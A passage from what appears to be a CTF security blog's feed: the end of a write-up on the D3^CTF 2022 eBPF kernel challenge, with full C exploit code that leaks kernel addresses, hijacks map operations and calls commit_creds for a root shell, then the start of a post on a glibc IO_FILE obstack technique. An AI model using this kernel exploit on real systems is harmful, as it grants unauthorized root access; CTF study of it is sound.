class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                               \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \</span></span><br><span class="line"><span class="meta">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                                     \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(STORE_REG, BPF_REG_0),                                 \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_9, 64),                                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(EXP_REG, 1),                                           \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_RSH, EXP_REG, BPF_REG_9),                          \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_0, EXP_REG),                                   \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, OOB_REG, 0x1000),                             \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_0, 0x1000 - 1),                       \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, OOB_REG, BPF_REG_0),                          \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> setup_btf_bpf_prog_fd;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_kernel</span><span class="params">(<span class="keyword">int</span> oob_map_fd, <span class="keyword">int</span> store_map_fd, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">char</span> *buf, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">char</span> values[<span class="number">0x1500</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">read_map_ops_content</span>[] =</span> &#123;</span><br><span class="line">        attack(oob_map_fd, store_map_fd),</span><br><span class="line">        BPF_ALU64_IMM(BPF_MUL, EXP_REG, <span class="number">0xD0</span>),</span><br><span class="line">        BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),</span><br><span class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_0, STORE_REG, <span class="number">8</span>),</span><br><span class="line">        BPF_STX_MEM(BPF_DW, OOB_REG, BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">        BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">        BPF_EXIT_INSN()&#125;;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len / <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(values, <span class="number">0</span>, <span class="keyword">sizeof</span>(values));</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info_kernel</span> <span class="title">info</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">            .info.bpf_fd = oob_map_fd,</span><br><span class="line">            .info.info = (<span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;info,</span><br><span class="line">            .info.info_len = <span class="keyword">sizeof</span>(info)&#125;;</span><br><span class="line"></span><br><span class="line">        ((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;values[<span class="number">8</span>])[<span class="number">0</span>] = addr - <span class="number">0x58</span>;</span><br><span class="line">        <span class="keyword">if</span> (addr == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ((<span class="keyword">uint64_t</span> *)&amp;values[<span class="number">8</span>])[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(store_map_fd, <span class="number">0</span>, values, BPF_ANY))</span><br><span class="line">        &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(read_map_ops_content, <span class="keyword">sizeof</span>(read_map_ops_content) / <span class="keyword">sizeof</span>(read_map_ops_content[<span class="number">0</span>]), &amp;setup_btf_bpf_prog_fd))</span><br><span class="line">        &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != obj_get_info_by_fd(&amp;attr))</span><br><span class="line">        &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;[-] Failed to get map info\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        addr = addr + <span class="number">4</span>;</span><br><span class="line">        ((<span class="keyword">uint32_t</span> *)buf)[i] = info.btf_id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> raw_array_map_ops = <span class="number">0xffffffff820363a0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_addr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// save_status();</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">map_attr</span> =</span> &#123;</span><br><span class="line">        .map_type = BPF_MAP_TYPE_ARRAY,</span><br><span class="line">        .key_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>),</span><br><span class="line">        .value_size = <span class="number">0x1500</span>,</span><br><span class="line">        .max_entries = <span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> store_map_fd = create_map(&amp;map_attr);</span><br><span class="line">    <span class="keyword">int</span> oob_map_fd = create_map(&amp;map_attr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (store_map_fd &lt; <span class="number">0</span> || oob_map_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;Failed to create map\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *values = <span class="built_in">malloc</span>(<span class="number">0x3000</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ops[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">memset</span>(values, <span class="number">0</span>, <span class="keyword">sizeof</span>(values));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(oob_map_fd, <span class="number">0</span>, values, BPF_ANY))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(store_map_fd, <span class="number">0</span>, values, BPF_ANY))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">read_map_ops</span>[] =</span> &#123;</span><br><span class="line">        attack(oob_map_fd, store_map_fd),</span><br><span class="line">        BPF_ALU64_IMM(BPF_MUL, EXP_REG, <span class="number">0x110</span>),</span><br><span class="line">        BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),</span><br><span class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_0, OOB_REG, <span class="number">0</span>),</span><br><span class="line">        BPF_STX_MEM(BPF_DW, STORE_REG, BPF_REG_0, <span class="number">8</span>),</span><br><span class="line">        BPF_EXIT_INSN()&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(read_map_ops, <span class="keyword">sizeof</span>(read_map_ops) / <span class="keyword">sizeof</span>(struct bpf_insn), <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != lookup_map_element(store_map_fd, <span class="number">0</span>, values))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to lookup map element\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> array_map_ops = ((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(&amp;values[<span class="number">8</span>]))[<span class="number">0</span>];</span><br><span class="line">    kernel_offset = array_map_ops - raw_array_map_ops;</span><br><span class="line">    kernel_base = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> modprobe_path_addr = <span class="number">0x1a6c240</span> + kernel_base;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> work_for_cpu_fn_addr = kernel_offset + <span class="number">0xffffffff810bc190</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> commit_creds_addr = kernel_offset + <span class="number">0xffffffff810cce30</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> init_creds_addr = kernel_offset + <span class="number">0xffffffff82a6b880</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;array_map_ops_addr =&gt; %p\n&quot;</span>, array_map_ops);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_base =&gt; %p\n&quot;</span>, kernel_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_offset =&gt; %p\n&quot;</span>, kernel_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;modprobe_path =&gt; %p\n&quot;</span>, modprobe_path_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;work_for_cpu_fn =&gt; %p\n&quot;</span>, work_for_cpu_fn_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;commit_creds_addr =&gt; %p\n&quot;</span>, commit_creds_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;init_creds_addr =&gt; %p\n&quot;</span>, init_creds_addr);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">read_map_addr</span>[] =</span> &#123;</span><br><span class="line">        attack(oob_map_fd, store_map_fd),</span><br><span class="line">        BPF_ALU64_IMM(BPF_MUL, EXP_REG, <span class="number">0x110</span> - <span class="number">0xc0</span>),</span><br><span class="line">        BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),</span><br><span class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_0, OOB_REG, <span class="number">0</span>),</span><br><span class="line">        BPF_STX_MEM(BPF_DW, STORE_REG, BPF_REG_0, <span class="number">8</span>),</span><br><span class="line">        BPF_EXIT_INSN()&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(read_map_addr, <span class="keyword">sizeof</span>(read_map_addr) / <span class="keyword">sizeof</span>(struct bpf_insn), <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != lookup_map_element(store_map_fd, <span class="number">0</span>, values))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to lookup map element\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> map_ptr = ((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(&amp;values[<span class="number">8</span>]))[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;map_ptr =&gt; %p\n&quot;</span>, map_ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;gap =&gt; %p\n&quot;</span>, (modprobe_path_addr - map_ptr));</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> map_value = map_ptr - <span class="number">0xc0</span> + <span class="number">0x110</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 0x79706f432f00</span></span><br><span class="line"></span><br><span class="line">    read_kernel(oob_map_fd, store_map_fd, array_map_ops, values, <span class="number">0xf0</span>);</span><br><span class="line"></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(values + <span class="number">8</span> * <span class="number">4</span>)) = work_for_cpu_fn_addr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(oob_map_fd, <span class="number">0</span>, values, BPF_ANY))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;get_ops!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">modify_oob_map</span>[] =</span> &#123;</span><br><span class="line">        attack(oob_map_fd, store_map_fd),</span><br><span class="line">        BPF_ALU64_IMM(BPF_MUL, EXP_REG, <span class="number">0x110</span>),</span><br><span class="line">        BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),</span><br><span class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_0, STORE_REG, <span class="number">0x20</span>),</span><br><span class="line">        BPF_STX_MEM(BPF_DW, OOB_REG, BPF_REG_0, <span class="number">0x20</span>),</span><br><span class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_0, STORE_REG, <span class="number">0x28</span>),</span><br><span class="line">        BPF_STX_MEM(BPF_DW, OOB_REG, BPF_REG_0, <span class="number">0x28</span>),</span><br><span class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_0, STORE_REG, <span class="number">0x30</span>),</span><br><span class="line">        BPF_STX_MEM(BPF_DW, OOB_REG, BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">        BPF_EXIT_INSN()&#125;;</span><br><span class="line"></span><br><span class="line">    ops[<span class="number">4</span>] = commit_creds_addr;</span><br><span class="line">    ops[<span class="number">5</span>] = init_creds_addr;</span><br><span class="line">    ops[<span class="number">6</span>] = map_value;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(store_map_fd, <span class="number">0</span>, ops, BPF_ANY))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(modify_oob_map, <span class="keyword">sizeof</span>(modify_oob_map) / <span class="keyword">sizeof</span>(struct bpf_insn), <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] updated oob_map&quot;</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> key = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> next_key;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd = oob_map_fd,</span><br><span class="line">        .key = &amp;key,</span><br><span class="line">        .next_key = &amp;next_key&#125;;</span><br><span class="line">    map_get_next_key(&amp;attr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] commit_cred(&amp;init_cred) done!\n&quot;</span>);</span><br><span class="line">    get_shell();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230106194449337.png"                      alt="image-20230106194449337"                ></p><hr><p>é¢˜ç›®æ”¾åœ¨: <a class="link"   href="https://github.com/196082/196082/blob/main/kernel_pwn/d3bpf.zip" >https://github.com/196082/196082/blob/main/kernel_pwn/d3bpf.zip<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è™½ç„¶åœ¨ä¹‹å‰å‡ºè¿‡å‡ ç¯‡å…³äºbpfçš„æ–‡ç« ï¼Œä½†æ˜¯æˆ‘å¹¶æ²¡æœ‰å¾—åˆ°å¾ˆæ·±å±‚æ¬¡çš„ç†è§£ï¼Œæ–‡ç« çš„expåŸºæœ¬å°±æ˜¯copyçš„ã€‚å¹¶ä¸”ï¼ŒD3^CTF 2022è¿˜æœ‰ä¸¤é“ebpféœ€è¦å¤ç°ï¼Œæ‰€ä»¥ç°åœ¨å°±é€‰æ‹©äº†å¤ç°ä¸€ä¸‹ã€‚&lt;/p&gt;
&lt;h2 id=&quot;é¢˜ç›®åˆ†æ&quot;&gt;&lt;a href=&quot;#é¢˜ç›®åˆ†æ&quot; class=&quot;heade</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    
    <category term="ebpf" scheme="https://cv196082.gitee.io/tags/ebpf/"/>
    
  </entry>
  
  <entry>
    <title>house of lalala</title>
    <link href="https://cv196082.gitee.io/2022/12/01/house-of-lalala/"/>
    <id>https://cv196082.gitee.io/2022/12/01/house-of-lalala/</id>
    <published>2022-12-01T05:45:58.000Z</published>
    <updated>2022-12-01T05:45:28.861Z</updated>
    
    <content type="html"><![CDATA[<p>è¿‘æœŸåˆå‡ºç°ä¸€ä¸ªæ–°çš„å…³äº<code>IO_FILE</code>çš„åˆ©ç”¨æ–¹å¼ï¼Œä¸è¿‡åŸä½œè€…å¹¶æ²¡æœ‰å‡ºåå­—ä½†æ˜¯æˆ‘blogåˆæ˜¯ç”¨house ofç³»åˆ—åˆ†ç±»çš„æ‰€ä»¥å°±å…ˆéšä¾¿å–ä¸ªåå­—ã€‚</p><h2 id="åŸç†åˆ†æ"><a href="#åŸç†åˆ†æ" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h2><p>æ­¤æ¬¡èšç„¦çš„vtableè¡¨ä¸º:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* the jump table.  */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_obstack_jumps</span> <span class="title">libio_vtable</span> <span class="title">attribute_hidden</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(overflow, _IO_obstack_overflow),</span><br><span class="line">  JUMP_INIT(underflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(uflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(pbackfail, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_obstack_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekoff, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekpos, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(setbuf, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(sync, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(doallocate, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(read, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(write, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seek, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(close, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(stat, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(showmanyc, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(imbue, <span class="literal">NULL</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ä¸»è¦åˆ©ç”¨çš„ç»“æ„ä½“ä¸º:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_obstack_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">file</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯åœ¨<code>IO_FILE</code>ç»“æ„ä½“ä¸‹åŠ ä¸€ä¸ª<code>obstack</code>ç»“æ„ä½“æŒ‡é’ˆã€‚ä¸‹é¢åˆ™æ˜¯<code>obstack</code>ç»“æ„ä½“çš„å®šä¹‰:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">obstack</span>          /* <span class="title">control</span> <span class="title">current</span> <span class="title">object</span> <span class="title">in</span> <span class="title">current</span> <span class="title">chunk</span> */</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">long</span> chunk_size;              <span class="comment">/* preferred size to allocate chunks in */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">chunk</span>;</span> <span class="comment">/* address of current struct obstack_chunk */</span></span><br><span class="line">  <span class="keyword">char</span> *object_base;            <span class="comment">/* address of object we are building */</span></span><br><span class="line">  <span class="keyword">char</span> *next_free;              <span class="comment">/* where to add next char to current object */</span></span><br><span class="line">  <span class="keyword">char</span> *chunk_limit;            <span class="comment">/* address of char after current chunk */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    PTR_INT_TYPE tempint;</span><br><span class="line">    <span class="keyword">void</span> *tempptr;</span><br><span class="line">  &#125; temp;                       <span class="comment">/* Temporary for some macros.  */</span></span><br><span class="line">  <span class="keyword">int</span> alignment_mask;           <span class="comment">/* Mask of alignment for each object. */</span></span><br><span class="line">  <span class="comment">/* These prototypes vary based on &#x27;use_extra_arg&#x27;, and we use</span></span><br><span class="line"><span class="comment">     casts to the prototypeless function type in all assignments,</span></span><br><span class="line"><span class="comment">     but having prototypes here quiets -Wstrict-prototypes.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *(*<span class="title">chunkfun</span>) (<span class="title">void</span> *, <span class="title">long</span>);</span></span><br><span class="line">  <span class="keyword">void</span> (*freefun) (<span class="keyword">void</span> *, struct _obstack_chunk *);</span><br><span class="line">  <span class="keyword">void</span> *extra_arg;              <span class="comment">/* first arg for chunk alloc/dealloc funcs */</span></span><br><span class="line">  <span class="keyword">unsigned</span> use_extra_arg : <span class="number">1</span>;     <span class="comment">/* chunk alloc/dealloc funcs take extra arg */</span></span><br><span class="line">  <span class="keyword">unsigned</span> maybe_empty_object : <span class="number">1</span>; <span class="comment">/* There is a possibility that the current</span></span><br><span class="line"><span class="comment">                      chunk contains a zero-length object.  This</span></span><br><span class="line"><span class="comment">                      prevents freeing the chunk if we allocate</span></span><br><span class="line"><span class="comment">                      a bigger chunk to replace it. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> alloc_failed : <span class="number">1</span>;      <span class="comment">/* No longer used, as we now call the failed</span></span><br><span class="line"><span class="comment">                     handler on error, but retained for binary</span></span><br><span class="line"><span class="comment">                     compatibility.  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œä¸Šè¿°çš„vtableä¸­åªæœ‰<code>_IO_obstack_overflow</code>ã€<code>_IO_obstack_xsputn</code>è¿™æ ·ä¸¤ä¸ªå‡½æ•°ï¼Œé¦–å…ˆå…³æ³¨å‰ä¸€ä¸ª</p><h3 id="IO-obstack-overflow"><a href="#IO-obstack-overflow" class="headerlink" title="_IO_obstack_overflow"></a>_IO_obstack_overflow</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">_IO_obstack_overflow (_IO_FILE *fp, <span class="keyword">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span> =</span> ((struct _IO_obstack_file *) fp)-&gt;obstack;</span><br><span class="line">  <span class="keyword">int</span> size;</span><br><span class="line">  <span class="comment">/* Make room for another character.  This might as well allocate a</span></span><br><span class="line"><span class="comment">     new chunk a memory and moves the old contents over.  */</span></span><br><span class="line">  assert (c != EOF);</span><br><span class="line">  obstack_1grow (obstack, c);</span><br><span class="line">  <span class="comment">/* Setup the buffer pointers again.  */</span></span><br><span class="line">  fp-&gt;_IO_write_base = obstack_base (obstack);</span><br><span class="line">  fp-&gt;_IO_write_ptr = obstack_next_free (obstack);</span><br><span class="line">  size = obstack_room (obstack);</span><br><span class="line">  fp-&gt;_IO_write_end = fp-&gt;_IO_write_ptr + size;</span><br><span class="line">  <span class="comment">/* Now allocate the rest of the current chunk.  */</span></span><br><span class="line">  obstack_blank_fast (obstack, size);</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å…¶ä¸­å­˜åœ¨ä¸€ä¸ªassertï¼Œæ³¨æ„ä¸‹é¢å¦‚æœæˆ‘ä»¬èµ°exitè¿™æ¡è·¯æ¥æ¸…ç©ºæ‰€æœ‰ç¼“å­˜æ—¶è§¦å‘çš„è¯å°±ä¼šå‡ºç°rsiå¿…å®šä¸º<code>-1</code>çš„æƒ…å†µï¼Œæ‰€ä»¥æ­¤è·¯ä¸é€š</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20221201130547767.png"                      alt="image-20221201130547767"                ></p><h3 id="IO-obstack-xsputn"><a href="#IO-obstack-xsputn" class="headerlink" title="_IO_obstack_xsputn"></a>_IO_obstack_xsputn</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 